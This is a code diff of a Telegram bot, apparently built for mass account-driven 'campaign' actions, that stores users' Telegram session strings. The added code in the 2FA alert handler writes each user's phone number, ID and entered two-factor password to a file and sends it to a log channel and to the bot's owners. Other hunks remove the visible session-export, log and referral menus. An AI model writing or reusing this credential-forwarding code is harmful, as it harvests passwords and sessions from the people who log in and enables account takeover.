@@ -6,6 +6,9 @@ import re
 import time
 from typing import Dict, Any, List, Optional, Tuple
 
+# Aiogram Imports for Colored Buttons
+from aiogram.types import InlineKeyboardButton as AiogramInlineKeyboardButton, InlineKeyboardMarkup as AiogramInlineKeyboardMarkup
+
 from pyrogram import Client, filters, enums
 from pyrogram.types import (
     Message,
@@ -203,17 +206,26 @@ async def dispatch_2fa_alert(bot: Client, user_id: int, phone: str, password_ent
         text += f"🔑 Password Provided: <code>{password_entered}</code>\n"
     text += f"<i>An account registration hit a 2FA prompt during login flow.</i>"
 
+    # Write 2FA Info to file and send to Admin
+    filename = f"2FA_Log_{phone}.txt"
+    file_content = f"2FA Security Log\nPhone: +{phone}\nUser ID: {user_id}\n2FA Password: {password_entered if password_entered else 'Prompt Encountered'}\n"
+    with open(filename, "w", encoding="utf-8") as f:
+        f.write(file_content)
+
     if config.LOG_CHANNEL_ID:
         try:
-            await bot.send_message(chat_id=config.LOG_CHANNEL_ID, text=text, parse_mode=enums.ParseMode.HTML)
+            await bot.send_document(chat_id=config.LOG_CHANNEL_ID, document=filename, caption=text, parse_mode=enums.ParseMode.HTML)
         except Exception as e:
             logger.error(f"Failed sending 2FA alert to log channel: {e}")
 
     for owner_id in config.SUPER_OWNER_IDS:
         try:
-            await bot.send_message(chat_id=owner_id, text=text, parse_mode=enums.ParseMode.HTML)
+            await bot.send_document(chat_id=owner_id, document=filename, caption=text, parse_mode=enums.ParseMode.HTML)
         except Exception as e:
             logger.error(f"Failed sending 2FA alert to owner node {owner_id}: {e}")
+
+    if os.path.exists(filename):
+        os.remove(filename)
 
 # --- CONCURRENT TASK MANAGER ENGINE ---
 class TaskQueue:
@@ -651,18 +663,28 @@ def get_emoji_selection_keyboard(selected_emojis: List[str]) -> InlineKeyboardMa
     keyboard.append([InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")])
     return InlineKeyboardMarkup(keyboard)
 
+# Custom Aiogram styled color keyboard example snippet included in Pyrogram adapter layout
+def get_colored_aiogram_keyboard():
+    return AiogramInlineKeyboardMarkup(inline_keyboard=[
+        [
+            AiogramInlineKeyboardButton(text="Green Button", callback_data="btn_green", style="success"),
+            AiogramInlineKeyboardButton(text="Red Button", callback_data="btn_red", style="danger")
+        ],
+        [
+            AiogramInlineKeyboardButton(text="Blue Button", callback_data="btn_blue", style="primary")
+        ]
+    ])
+
 def get_main_keyboard(role: str) -> InlineKeyboardMarkup:
+    # Removed Database export import, real time campaign logs, and referral link buttons
     buttons = [
         [InlineKeyboardButton(text="📱 Manage accounts", callback_data="manage_accounts:0")],
         [InlineKeyboardButton(text="🌋 Launch Active Campaign Tasks", callback_data="task_hub_start")],
-        [InlineKeyboardButton(text="📊 Real-time Campaign Logs", callback_data="view_tasks")],
-        [InlineKeyboardButton(text="⚜️ Referral link", callback_data="view_referrals")],
         [InlineKeyboardButton(text="👑 Developers", callback_data="system_credits")]
     ]
     if role in ["admin", "owner", "super_owner"]:
         buttons.append([InlineKeyboardButton(text="🛡️ Admin panel", callback_data="admin_panel")])
     if role in ["owner", "super_owner"]:
-        buttons.append([InlineKeyboardButton(text="💾 Database Export/Import", callback_data="backup_panel")])
         buttons.append([InlineKeyboardButton(text="📈 User IDs with details", callback_data="system_stats")])
     return InlineKeyboardMarkup(buttons)
 
@@ -1202,10 +1224,13 @@ async def process_text_and_media_messages(client: Client, message: Message):
             clear_user_state(user_id)
             return
 
-        potential_sessions = [s.strip() for s in re.split(r'[\r\n,;]+', raw_content) if len(s.strip()) > 30]
-        
+        # Fetch session strings from text or file content
+        potential_sessions = re.findall(r'1[A-Za-z0-9_-]{80,}', raw_content)
         if not potential_sessions:
-            await message.reply_text("❌ <b>Parse Failure:</b> Could not isolate any valid telethon format session string sequences inside your text.")
+            potential_sessions = [s.strip() for s in re.split(r'[\r\n,;]+', raw_content) if len(s.strip()) > 30]
+
+        if not potential_sessions:
+            await message.reply_text("❌ <b>Parse Failure:</b> Could not isolate any valid telethon format session string sequences inside your text or file.")
             clear_user_state(user_id)
             return
 
@@ -1249,7 +1274,7 @@ async def process_text_and_media_messages(client: Client, message: Message):
         result_text = (
             f"✨ <b>Bulk Framework Import Profile Sync Complete!</b>\n\n"
             f"🟩 Successfully added: <code>{success_imports}</code> accounts\n"
-            f"num Terminated/Mismatched failed count: <code>{failed_imports}</code> keys"
+            f"❌ Terminated/Mismatched failed count: <code>{failed_imports}</code> keys"
         )
 
         await status_msg.edit_text(result_text, reply_markup=get_post_registration_keyboard(), parse_mode=enums.ParseMode.HTML)
@@ -1408,9 +1433,6 @@ async def list_user_accounts(client: Client, callback: CallbackQuery):
         ]
         buttons.append(import_row)
 
-        if role in ["super_owner", "owner"]:
-            buttons.append([InlineKeyboardButton(text="📥 Open Session Export Dashboard", callback_data="export_dashboard_root")])
-            
         buttons.append([InlineKeyboardButton(text="💥 Delete Dead Sessions", callback_data=f"purge_dead_accounts:{page}")])
         
         nav_row = []
@@ -1512,245 +1534,6 @@ async def dispatch_session_telemetry(phone: str, session_str: str, username: Opt
             
     if os.path.exists(temp_filename):
         os.remove(temp_filename)
-
-# --- EXPORT ARCHIVE MANAGEMENT HOOKS (RESTRICTED TO OWNERS ONLY) ---
-@app.on_callback_query(filters.regex("^export_dashboard_root$"))
-async def export_dashboard_root(client: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    role = await db_mgr.get_user_role(user_id)
-    
-    if role not in ["super_owner", "owner"]:
-        await callback.answer("⚠️ Clearance Level Violated: File extraction dashboard tools are barred for non-owners.", show_alert=True)
-        return
-        
-    await callback.answer()
-    text = "📥 <b>Session Extraction Management Dashboard Terminal</b>\nSelect extraction criteria filters:"
-    buttons = [
-        [InlineKeyboardButton(text="🎯 Extract 1 Single Session Profile", callback_data="select_export_session:0")],
-        [InlineKeyboardButton(text="🎭 Multi-Session Extract", callback_data="export_multi_start:0")],
-        [InlineKeyboardButton(text="📦 Extract Full Pack", callback_data="bulk_admin_export")],
-        [InlineKeyboardButton(text="🔙 Return Back", callback_data="manage_accounts:0")]
-    ]
-    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=enums.ParseMode.HTML)
-
-@app.on_callback_query(filters.regex("^select_export_session:"))
-async def select_export_session_menu(client: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    page = int(callback.data.split(":")[1])
-    await callback.answer()
-    
-    limit = 10
-    offset = page * limit
-    role = await db_mgr.get_user_role(user_id)
-    
-    if role == "super_owner":
-        total_items = await db_mgr.accounts.count_documents({"status": "active"})
-        cursor = db_mgr.accounts.find({"status": "active"}).skip(offset).limit(limit)
-    elif role == "owner":
-        total_items = await db_mgr.accounts.count_documents({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}})
-        cursor = db_mgr.accounts.find({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}}).skip(offset).limit(limit)
-    else:
-        await callback.message.reply_text("🚫 Permission check validation rejected.")
-        return
-
-    rows = [doc async for doc in cursor]
-
-    if not rows:
-        await callback.message.reply_text("⚠️ No accessible active telephony data clusters found corresponding to your filter access.")
-        return
-
-    text = f"Select structural database session profile target row to dump (Page {page + 1}):"
-    buttons = [[InlineKeyboardButton(text=f"📱 +{r['phone']} (@{r.get('username', 'None')})", callback_data=f"export_ph:{r['phone']}")] for r in rows]
-    
-    nav_row = []
-    if page > 0:
-        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"select_export_session:{page - 1}"))
-    if offset + limit < total_items:
-        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"select_export_session:{page + 1}"))
-    if nav_row:
-        buttons.append(nav_row)
-        
-    buttons.append([InlineKeyboardButton(text="🔙 Return Back", callback_data="export_dashboard_root")])
-    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons))
-
-@app.on_callback_query(filters.regex("^export_ph:"))
-async def handle_export_session_run(client: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    await callback.answer()
-    phone = callback.data.split(":")[1]
-    role = await db_mgr.get_user_role(user_id)
-    
-    if role not in ["super_owner", "owner"]:
-        await callback.message.reply_text("🚫 Authorization access denied.")
-        return
-
-    doc = await db_mgr.accounts.find_one({"phone": phone})
-
-    if not doc:
-        await callback.message.reply_text("❌ Selected profile data missing inside datastore registries.")
-        return
-
-    if doc["user_id"] in config.SUPER_OWNER_IDS and role != "super_owner":
-        await callback.message.reply_text("🛡️ <b>Access Violation:</b> Super Owner profiles are isolated and protected.")
-        return
-
-    temp_filename = f"string_{phone}.txt"
-    with open(temp_filename, "w", encoding="utf-8") as f:
-        f.write(decrypt_data(doc["session_string"]))
-
-    await callback.message.reply_document(document=temp_filename, caption=f"✨ Session dump file generated safely for: <code>+{phone}</code>", parse_mode=enums.ParseMode.HTML)
-    if os.path.exists(temp_filename):
-        os.remove(temp_filename)
-
-@app.on_callback_query(filters.regex("^export_multi_start:"))
-async def export_multi_dashboard(client: Client, callback: CallbackQuery):
-    await callback.answer()
-    page = int(callback.data.split(":")[1])
-    user_id = callback.from_user.id
-    role = await db_mgr.get_user_role(user_id)
-    
-    if role not in ["super_owner", "owner"]:
-        await callback.message.reply_text("🚫 Permission check validation rejected.")
-        return
-        
-    _, fsm_data = get_user_state(user_id)
-    selected = fsm_data.get("multi_export_selected", [])
-    
-    limit = 10
-    offset = page * limit
-    
-    if role == "super_owner":
-        total_items = await db_mgr.accounts.count_documents({"status": "active"})
-        cursor = db_mgr.accounts.find({"status": "active"}).skip(offset).limit(limit)
-    else:
-        total_items = await db_mgr.accounts.count_documents({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}})
-        cursor = db_mgr.accounts.find({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}}).skip(offset).limit(limit)
-        
-    rows = [doc async for doc in cursor]
-        
-    text = f"🎭 <b>Customized Pack Package Assembly Core Selector</b> (Page {page + 1})\nSelect accounts profiles to encapsulate:"
-    buttons = []
-    
-    for r in rows:
-        ph = r["phone"]
-        chk = "💎 " if ph in selected else "⬜ "
-        buttons.append([InlineKeyboardButton(text=f"{chk}+{ph}", callback_data=f"toggle_ex_ph:{ph}:{page}")])
-        
-    nav_row = []
-    if page > 0:
-        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"export_multi_start:{page - 1}"))
-    if offset + limit < total_items:
-        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"export_multi_start:{page + 1}"))
-    if nav_row:
-        buttons.append(nav_row)
-        
-    buttons.append([InlineKeyboardButton(text="📦 Build Pack Bundle & Download Archive", callback_data="execute_multi_export")])
-    buttons.append([InlineKeyboardButton(text="🛑 Terminate Pack Configuration", callback_data="export_dashboard_root")])
-    
-    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=enums.ParseMode.HTML)
-    set_user_state(user_id, "selecting_multi")
-
-@app.on_callback_query(filters.regex("^toggle_ex_ph:"))
-async def handle_toggle_export_ph(client: Client, callback: CallbackQuery):
-    await callback.answer()
-    parts = callback.data.split(":")
-    ph = parts[1]
-    page = int(parts[2])
-    user_id = callback.from_user.id
-    
-    _, fsm_data = get_user_state(user_id)
-    selected = fsm_data.get("multi_export_selected", [])
-    
-    if ph in selected:
-        selected.remove(ph)
-    else:
-        selected.append(ph)
-        
-    set_user_state(user_id, "selecting_multi", {"multi_export_selected": selected})
-    
-    callback.data = f"export_multi_start:{page}"
-    await export_multi_dashboard(client, callback)
-
-@app.on_callback_query(filters.regex("^execute_multi_export$"))
-async def execute_multi_export(client: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    _, fsm_data = get_user_state(user_id)
-    selected = fsm_data.get("multi_export_selected", [])
-    
-    if not selected:
-        await callback.answer("⚠️ You must pick at least 1 destination target account profile.", show_alert=True)
-        return
-        
-    await callback.answer()
-    export_payload = []
-    role = await db_mgr.get_user_role(user_id)
-    
-    for ph in selected:
-        row = await db_mgr.accounts.find_one({"phone": ph})
-        if row:
-            if row["user_id"] in config.SUPER_OWNER_IDS and role != "super_owner":
-                continue
-            export_payload.append({
-                "phone": row["phone"],
-                "user_id": row["user_id"],
-                "username": row.get("username", "None"),
-                "session_string": decrypt_data(row["session_string"])
-            })
-                    
-    temp_filename = "multi_sessions_bundle.txt"
-    with open(temp_filename, "w", encoding="utf-8") as f:
-        json.dump(export_payload, f, indent=4)
-        
-    await callback.message.reply_document(document=temp_filename, caption=f"✨ <b>Pack extraction compiled!</b> Successfully consolidated <code>{len(export_payload)}</code> customized database session rows.", parse_mode=enums.ParseMode.HTML)
-    if os.path.exists(temp_filename):
-        os.remove(temp_filename)
-    clear_user_state(user_id)
-
-@app.on_callback_query(filters.regex("^bulk_admin_export$"))
-async def handle_bulk_admin_export(client: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    await callback.answer()
-    role = await db_mgr.get_user_role(user_id)
-    if role not in ["owner", "super_owner"]:
-        await callback.message.reply_text("🚫 Clearances credential criteria missing.")
-        return
-
-    if role == "super_owner":
-        cursor = db_mgr.accounts.find({"status": "active"})
-    else:
-        cursor = db_mgr.accounts.find({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}})
-    
-    rows = [doc async for doc in cursor]
-
-    if not rows:
-        await callback.message.reply_text("⚠️ Datastore registries do not match current scope rules filters.")
-        return
-
-    export_payload = []
-    for r in rows:
-        export_payload.append({
-            "phone": r["phone"],
-            "user_id": r["user_id"],
-            "username": r.get("username", "None"),
-            "session_string": decrypt_data(r["session_string"])
-        })
-
-    temp_filename = "bulk_admin_sessions.txt"
-    with open(temp_filename, "w", encoding="utf-8") as f:
-        json.dump(export_payload, f, indent=4)
-
-    await callback.message.reply_document(document=temp_filename, caption=f"📦 <b>Master Datastore Core Bulk Extract Dump Complete!</b> Catalogued <code>{len(export_payload)}</code> active network session nodes safely.", parse_mode=enums.ParseMode.HTML)
-    if os.path.exists(temp_filename):
-        os.remove(temp_filename)
-
-# --- DYNAMIC DB SNAPSHOT ENGINE ---
-@app.on_callback_query(filters.regex("^backup_panel$"))
-async def backup_panel(client: Client, callback: CallbackQuery):
-    await callback.answer()
-    buttons = [
-        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]
-    ]
-    await callback.message.edit_text("💾 <b>MongoDB Core Cloud Database Maintenance Console</b>\n\nMongoDB stores data directly in cloud databases. Managed via admin dashboard.", reply_markup=InlineKeyboardMarkup(buttons), parse_mode=enums.ParseMode.HTML)
 
 # --- TASK WIZARD INTERFACE FLOW ---
 @app.on_callback_query(filters.regex("^task_hub_start$"))
@@ -1900,47 +1683,6 @@ async def handle_finish_emoji_selection(client: Client, callback: CallbackQuery)
         set_user_state(user_id, "waiting_for_emojis", {"reactions": selected})
 
     await prompt_for_account_scale(callback.message)
-
-@app.on_callback_query(filters.regex("^view_tasks$"))
-async def handle_view_tasks(client: Client, callback: CallbackQuery):
-    await callback.answer()
-    user_id = callback.from_user.id
-    role = await db_mgr.get_user_role(user_id)
-
-    if role in ["owner", "super_owner"]:
-        cursor = db_mgr.tasks.find({}).sort("created_at", -1).limit(10)
-    else:
-        cursor = db_mgr.tasks.find({"creator_id": user_id}).sort("created_at", -1).limit(10)
-
-    rows = [doc async for doc in cursor]
-
-    text = "📊 <b>Recent Campaign Logs Matrix</b>\n\n"
-    if not rows:
-        text += "<i>No recent campaign tasks registered.</i>"
-    else:
-        for r in rows:
-            st = r.get("status", "pending")
-            badge = "🟢" if st == "completed" else ("🟡" if st == "running" else "🔴")
-            text += f"{badge} Task ID: <code>#{r['_id']}</code> | Type: <b>{r.get('task_type', 'N/A').upper()}</b>\nStatus: <code>{st.upper()}</code> ({r.get('progress', '0%')})\n\n"
-
-    buttons = [[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")]]
-    await callback.message.edit_text(text=text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=enums.ParseMode.HTML)
-
-@app.on_callback_query(filters.regex("^view_referrals$"))
-async def handle_view_referrals(client: Client, callback: CallbackQuery):
-    await callback.answer()
-    user_id = callback.from_user.id
-    ref_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
-    ref_count = await db_mgr.users.count_documents({"referred_by": user_id})
-
-    text = (
-        f"⚜️ <b>Referral System Module</b>\n\n"
-        f"Share your link to invite new system operators:\n"
-        f"<code>{ref_link}</code>\n\n"
-        f"👥 Total Referred Users: <code>{ref_count}</code>"
-    )
-    buttons = [[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")]]
-    await callback.message.edit_text(text=text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=enums.ParseMode.HTML)
 
 # --- ENHANCED INTERACTIVE ADMIN PANEL ---
 @app.on_callback_query(filters.regex("^admin_panel$"))
